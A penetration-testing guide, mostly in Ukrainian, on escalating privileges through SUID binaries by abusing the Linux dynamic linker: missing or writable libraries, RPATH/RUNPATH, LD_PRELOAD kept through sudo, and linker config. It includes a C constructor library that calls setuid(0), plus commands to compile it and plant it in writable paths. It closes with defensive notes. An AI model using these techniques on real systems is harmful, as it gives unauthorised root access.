# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID-бінарні файли зазвичай перевіряють на можливість прямого виконання команд, але кастомні SUID-програми також можуть бути вразливими через dynamic linker. Загальна ідея проста: привілейований executable завантажує code із path або configuration, на які користувач із нижчими привілеями може впливати.

Ця сторінка зосереджена на загальних шаблонах технік: відсутні libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` через sudo, linker configuration і плутанина з SUID hardlink.

## Швидка Enumeration

Почніть із пошуку незвичних SUID-файлів і перевірки, чи використовують вони dynamic linking:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Зосередьтеся на нестандартних розташуваннях, спеціальних шляхах застосунків, binaries, що належать root, але розташовані поза каталогами, якими керує пакетний менеджер, і dependencies, що завантажуються з доступних для запису каталогів.

Корисні перевірки можливості запису:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Some custom SUID binaries try to load a shared object that does not exist. If the missing path is under a directory controlled by the attacker, the binary may load attacker-supplied code as the effective user.

Знайдіть невдалі спроби пошуку library:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Якщо binary шукає `libexample.so` у доступному для запису шляху, мінімальна proof library може використовувати constructor. Під час validation зберігайте proof-of-impact нешкідливим:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Скомпілюйте його з точною назвою файлу, яку намагається завантажити бінарний файл:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Експлуатованою умовою є не лише відсутня library. Зловмисник має мати змогу розмістити сумісний shared object за шляхом, який прийме privileged loader.

## Writable Library Directory

Іноді всі залежності існують, але один із каталогів, що використовуються для їхнього пошуку, доступний для запису. Це може дозволити замінити завантажену library або розмістити library з вищим пріоритетом із таким самим ім’ям.

Перевірте шляхи залежностей:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Якщо каталог доступний для запису, перевірте це в лабораторному середовищі безпечним для копіювання способом. Заміна системних бібліотек на активному хості може порушити автентифікацію, керування пакетами або критично важливі для завантаження служби.

## RPATH і RUNPATH

`RPATH` і `RUNPATH` — це записи dynamic-section, які вказують loader, де шукати бібліотеки. Вони небезпечні в SUID-програмах, якщо вказують на каталоги, доступні attacker для запису.

Виявлення:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Приклад ризикованого виводу:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Якщо каталог `/opt/app/lib` доступний для запису, а бінарному файлу потрібен `libcustom.so`, зловмисник може розмістити там шкідливий `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` і `RUNPATH` не є ідентичними в усіх деталях розв’язання, але під час перевірки privilege-escalation практичне питання однакове: чи шукає SUID binary бібліотеку за її назвою в директорії, доступній для запису attacker?

## LD_PRELOAD, LD_LIBRARY_PATH і SUID

Для звичайних програм `LD_PRELOAD` і `LD_LIBRARY_PATH` можуть примусово завантажувати shared object або впливати на його завантаження. Для SUID-програм dynamic loader зазвичай переходить у secure-execution mode та ігнорує небезпечні змінні середовища.

Це означає, що звичайний SUID binary зазвичай не є вразливим лише тому, що користувач може встановити `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Поширеним винятком є неправильне налаштування sudo. Якщо `sudo -l` показує, що така змінна, як `LD_PRELOAD` або `LD_LIBRARY_PATH`, зберігається, команда, дозволена sudo, може завантажити код під контролем атакувальника:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Не плутайте ці випадки:

- `LD_PRELOAD` проти звичайного SUID binary: зазвичай блокується secure execution.
- `LD_PRELOAD`, збережений через sudo: потенційно exploitable.
- Відсутній `.so` у writable path: exploitable, коли SUID binary природним чином завантажує цей path.
- `RPATH`/`RUNPATH` до writable directory: exploitable, коли потрібною library можна керувати.
- Доступ на запис до `/etc/ld.so.preload` або linker config: системний вплив високого рівня.

## Конфігурація linker

Dynamic linker також читає системну конфігурацію, зокрема `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache і в деяких випадках `/etc/ld.so.preload`.

Перевірки з високою цінністю:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.

## SUID Hardlink Confusion

Hardlinks can make the same SUID inode appear under multiple names. This is useful for hiding a privileged helper, confusing cleanup, or bypassing naive path-based review.

Знайдіть SUID-файли, які мають більше одного link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Перевірте всі шляхи до того самого inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Зловживання полягає не в тому, що hardlink змінює дозволи. Зловживання — це плутанина шляхів: привілейований inode може бути доступним через ім’я, якого захисники або скрипти не очікують. Докладніше про inode та workflow роботи з hardlink див. [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Захисні примітки

- Зводьте кількість SUID-бінарних файлів до мінімуму, проводьте їх аудит і, за можливості, керуйте ними через пакети.
- Уникайте записів `RPATH`/`RUNPATH`, що вказують на каталоги, доступні для запису або керовані застосунками.
- Каталоги бібліотек мають належати root і бути недоступними для запису звичайними користувачами.
- Не зберігайте `LD_PRELOAD`, `LD_LIBRARY_PATH` або подібні змінні loader через sudo.
- Відстежуйте `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` та неочікувані SUID-файли.
- Перевіряйте SUID-файли, пов’язані через hardlink, і досліджуйте власні SUID-обгортки за межами стандартних системних шляхів.
